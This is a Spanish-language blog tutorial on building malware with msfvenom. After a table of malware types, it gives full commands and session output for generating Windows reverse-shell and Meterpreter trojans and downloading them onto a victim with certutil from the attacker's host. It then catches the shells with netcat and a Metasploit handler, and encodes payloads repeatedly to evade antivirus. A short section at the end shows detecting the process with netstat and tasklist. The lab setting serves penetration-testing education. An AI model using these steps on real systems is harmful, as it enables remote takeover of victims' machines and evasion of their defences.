---
date: 2022-04-27T22:40:05.000Z
layout: post
comments: true
title: Creación de malware
subtitle: 'por medio de msfvenom'
description: >-
image: >-
    http://imgfz.com/i/kAO6vGe.png
optimized_image: >-
  http://imgfz.com/i/kAO6vGe.png
category: ciberseguridad
tags:
  - reverse
  - malware
  - troyano
  - msfvenom
  - handler
  - metasploit
  - meterpreter
  - forense
  - explotación
  - linux
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

### Tipos de malware

| Tipo | Descripción |
| :--------: | :-------: |
| Virus | Es un pequeño fragmento de código que se propaga de un ordenador a otro, sin ninguna acción directa ni autorización por parte de los propietarios de las máquinas infectadas. Suelen copiarse en secciones especiales del disco duro, dentro de programas o documentos legítimos. A continuación, se ejecutan cada vez que se abre un programa o archivo infectado. |
| Troyano | Como su nombre indica, es un malware que viene incrustado en un archivo aparentemente inofensivo, como un ejecutable, un documento de Microsoft Office, un protector de pantalla o un archivo PDF. Cuando un usuario abre el archivo malicioso, cae víctima del malware (el más conocido es la puerta trasera o backdoor).
| Backdoor | Software formado por dos componentes: un servidor y un cliente de puerta trasera. El servidor se ejecuta en la máquina víctima escuchando en la red y aceptando conexiones. El cliente suele ejecutarse en la máquina del atacante, y se utiliza para conectarse al backdoor y controlarlo (el tipo ```connect-back backdoor``` o ```reverse backdoor```, es el mecanismo común para realizar un byPass al firewall). |
| Rootkit | Es un malware diseñado para ocultarse de los usuarios y del programa antivirus con el fin de alterar completamente el funcionamiento del sistema operativo. Permite a un atacante mantener acceso privilegiado a la máquina víctima sin ser notado. |
| Bootkit | Son rootkits que eluden los mecanismos de protección del sistema operativo ejecutándose durante la fase de arranque. Se inician antes que el sistema operativo, por lo que consiguen un control total sobre la máquina y el sistema operativo. |
| Adware | Es un software molesto que muestra anuncios a los usuarios de ordenadores. |
| Spyware | Es un software utilizado para recopilar información sobre la actividad de los usuarios, como el sistema operativo instalado en una máquina, los sitios web visitados, las contraseñas, entre otras cosas. La información se envía a un servidor de recopilación de registros controlado por el atacante. |
| Dialer | Es un software que intenta marcar números en conexiones de acceso telefónico para cobrar dinero de la factura telefónica de la víctima. Hoy en día, los dialers se dirigen a los smartphones. |
| Keylogger | Es un software especial que registra cada pulsación de tecla en la máquina de la víctima remota. Las operaciones realizadas por los keloggers son: registrar las pulsaciones de teclas, registrar el nombre de la ventana en la que el usuario víctima estaba escribiendo, guardar las pulsaciones de teclas en un archivo de registro en la máquina víctima, enviar los registros a un servidor controlado por el atacante.  Acaba de ver cómo funcionan los keyloggers por software. También existen keyloggers por hardware y rootkits, que son más sigilosos e invisibles para el usuario víctima que los keyloggers por software. |
| Bots | Son pequeñas piezas de software que se instalan en millones de máquinas conectadas a Internet para realizar ataques DDoS como fuentes de spam. Estos bots son dirigidos remotamente por un servidor de comando y control. Este servidor puede ordenar a miles o incluso millones de bots que realicen una operación determinada simultáneamente. |
| Ransomware | Es un software que cifra el contenido de un ordenador o smartphone con una clave secreta. A continuación, pide a sus víctimas un rescate para devolverles el contenido. |
| Data Stealing | Tiene un objetivo preciso, el cual es robar los datos más importantes del disco duro de la víctima y enviárselos al atacante. La mayoría de las veces, esta encarnación específica de malware está dirigida a una empresa concreta y adaptada para funcionar en el entorno objetivo. Como alternativa, un atacante podría utilizar una puerta trasera para realizar el robo de datos. |
| Worms | Los gusanos se propagan por la red aprovechando las vulnerabilidades de los sistemas operativos y del software. También pueden aprovechar credenciales predeterminadas o configuraciones erróneas para atacar un servicio o una máquina. Suelen formar parte de otro malware y ofrecen un punto de entrada en el sistema objetivo. |
| Greyware | Es un término general utilizado para indicar malware que no entra en una categoría específica. |

### Msfvenom (Netcat)

Es un generador de carga útil independiente. Es una combinación de Msfpayload y Msfencode. Es rápido y utiliza una sola instancia. También tiene opciones de línea de comando estandarizadas. Puede generar cargas útiles para tantas plataformas como Cisco, Android, OSX, BSD, Solaris, Firefox, Windows, Unix, Nodejs y mucho más.

A continuación creamos el payload, el cual por defecto será para arquitecturas x32. Para asignar x64 se debe asignar windows/x64/meterpreter/reverse_tcp.

```bash
┌─[root@kali]─[/home/user/malware]
└──╼ msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.1.1.19 -f exe -o test.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: test.exe
```

Nos decargamos el payload en la máquina víctima de la siguiente forma:

```cmd
C:\\Users\Demo\Desktop>certutil.exe -f -urlcache -split http://10.1.1.19/test.exe test.exe
**** En línea ****
  000000 ...
  01204a
CertUtil: -URLCache comando completado correctamente.
```

![malwaretestexenetcat](/images/malwaretestexenetcat.png)

Y nos ponemos a la escucha por ```netcat```:

```bash
┌─[root@kali]─[/home/user/malware]
└──╼ rlwrap nc -nlvp 443 
listening on [any] 443 ...
```

Para finalmente ejecutar el payload y recibir la conexión remota:

![dobleclicktestexe](/images/dobleclicktestexe.png)

```bash
┌─[root@kali]─[/home/user/malware]
└──╼ rlwrap nc -nlvp 443 
listening on [any] 443 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.5] 1322
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Users\Demo\Desktop>whoami
whoami
demo-pc\demo

C:\Users\Demo\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 4479-B434

 Directorio de C:\Users\Demo\Desktop

22-01-2023  16:34    <DIR>          .
22-01-2023  16:34    <DIR>          ..
20-09-2022  19:03               194 a.txt
17-03-2021  04:06               925 Nmap - Zenmap GUI.lnk
27-04-2022  20:38            73.802 poc.exe
22-01-2023  16:34            73.802 test.exe
20-09-2022  18:41               849 �Torrent.lnk
               5 archivos        149.572 bytes
               2 dirs  21.169.504.256 bytes libres

C:\Users\Demo\Desktop>
```

### Msfvenom (meterpreter)

Para el caso de ```meterpreter``` creamos un ejecutable malicioso, el cual por defecto será para arquitecturas x32. Para asignar x64 se debe asignar windows/x64/meterpreter/reverse_tcp.

```bash
┌─[root@kali]─[/home/user/malware]
└──╼ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.1.1.19 lport=9999 -f exe -o poc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: poc.exe
```

Parámetros usados:

| Parámetro | Utilidad |
| :--------: | :-------: |
| -p | Se carga el payload. |
| lhost | La dirección IP de la máquina atacante. |
| lport | El puerto que se usará para ejecutar el malware. |
| -f | Se selecciona el tipo de archivo que queremos. |
| -o | Se le asigna un nombre. |

El ejecutable lo trasladamos a la máquina victima:

![1](http://imgfz.com/i/MXWNr4G.png)

Ahora procedemos a ponernos a la escucha:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > set LHOST 10.1.1.19
LHOST => 10.1.1.19
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.1.1.19:9999 
```
Ahora ejecutamos el troyano en la máquina victima:

![2](http://imgfz.com/i/IxQi5sr.png)

Se recibe y crea la sesión en nuestra máquina:

```
[*] Sending stage (175174 bytes) to 10.1.1.5
[*] Meterpreter session 1 opened (10.1.1.19:9999 -> 10.1.1.5:1204 ) at 2022-04-27 19:46:16 -0400

meterpreter > shell
Process 356 created.
Channel 1 created.
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Users\Demo\Desktop>whoami
whoami
demo-pc\demo

C:\Users\Demo\Desktop>ipconfig
ipconfig

Configuraci�n IP de Windows


Adaptador de Ethernet Conexi�n de �rea local:

   Sufijo DNS espec�fico para la conexi�n. . : 
   Direcci�n IPv6 . . . . . . . . . . : fd17:625c:f037:101:38fa:7c31:76d4:8fb7
   Direcci�n IPv6 temporal. . . . . . : fd17:625c:f037:101:d4c7:ff3e:dc1b:b81b
   V�nculo: direcci�n IPv6 local. . . : fe80::38fa:7c31:76d4:8fb7%11
   Direcci�n IPv4. . . . . . . . . . . . . . : 10.1.1.5
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%11
                                       10.1.1.1

Adaptador de t�nel isatap.{013659A2-A2D8-4DE0-AF04-BB55011CFF79}:

   Estado de los medios. . . . . . . . . . . : medios desconectados
   Sufijo DNS espec�fico para la conexi�n. . : 

C:\Users\Demo\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 4479-B434

 Directorio de C:\Users\Demo\Desktop

27-04-2022  20:44    <DIR>          .
27-04-2022  20:44    <DIR>          ..
17-03-2021  04:06               925 Nmap - Zenmap GUI.lnk
27-04-2022  20:38            73.802 poc.exe
               2 archivos         74.727 bytes
               2 dirs  20.974.960.640 bytes libres
```

### Codificar malware

Esto sirve para intentar ocultar el malware y que este no sea detectado dentro del sistema:

```
┌─[root@kali]─[/home/user/malware]
└──╼ msfvenom -p windows/meterpreter/reverse_tcp -i 10 -e x86/shikata_ga_nai lhost=10.1.1.19 lport=9999 -f exe -o poc2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes
Saved as: poc2.exe
```
Parámetros usados:

| Parámetro | Utilidad |
| :--------: | :-------: |
| -i | Cantidad de veces que se va a codificar. |
| -e | Se selecciona el tipo de codificador. |

Para ver la lista de codificadores que contiene msfvenom de deber realizar lo siguiente:

```
┌─[root@kali]─[/home/user/malware]
└──╼ msfvenom -l encoders
```

>Para evasión de antivirus se recomienda ver los [apuntes relacionados en esta página](https://nptg24.github.io/antivirus-evasion/).


### Forense

Ahora desde el lado de la víctima ¿cómo se descubre que se está ejecutando un proceso como este?. La respuesta es a través de dos comandos, iniciando por ```netstat```:

![3](http://imgfz.com/i/jCP63Yc.png)

Se identifica un puerto extraño. Ahora a través de ```tasklist``` y con el PID que en este caso es 1004, podremos descubrir cual es el troyano en ejecución:

![4](http://imgfz.com/i/UyWCaxj.png)

Si seguimos bajando lo podremos detectar:

![5](http://imgfz.com/i/TQVYPH2.png)
